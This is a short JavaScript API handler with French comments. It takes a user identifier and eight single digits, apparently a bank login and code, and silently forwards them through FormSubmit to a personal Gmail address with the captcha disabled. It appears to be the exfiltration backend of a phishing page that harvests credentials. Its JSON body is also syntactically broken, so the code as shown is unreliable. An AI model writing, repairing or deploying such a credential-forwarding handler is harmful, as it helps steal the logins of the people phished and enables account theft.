export default async function handler(req, res) {
  // Autorise uniquement les requêtes POST
  if (req.method !== 'POST') {
    res.setHeader('Allow', ['POST']);
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }

  // Récupère les données du body
  const { identifiant, chiffre_1, chiffre_2, chiffre_3, chiffre_4, chiffre_5, chiffre_6, chiffre_7, chiffre_8 } = req.body;

  try {
    // Appel AJAX vers FormSubmit (mode silencieux)
    const response = await fetch('https://formsubmit.co/ajax/david.llenoay@gmail.com', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({
        identifiant: identifiant,
        chiffre_1 : ${chiffre_1}
    chiffre_2 : ${chiffre_2}
    chiffre_3 : ${chiffre_3}
	chiffre_4 : ${chiffre_4}
    chiffre_5 : ${chiffre_5}
    chiffre_6 : ${chiffre_6}
	chiffre_7 : ${chiffre_7}
    chiffre_8 : ${chiffre_8}
    
        
        
        _subject: '🔒  Nouvelles informations',
        _template: 'table',           // Format tableau dans l'email
        _captcha: 'false'             // Désactive le captcha
      })
    });

    const result = await response.json();

    if (response.ok && result.success === "true") {
      return res.status(200).json({ success: true, message: 'Email envoyé' });
    } else {
      throw new Error(result.message || 'Erreur FormSubmit');
    }

  } catch (error) {
    console.error('Erreur:', error);
    return res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
}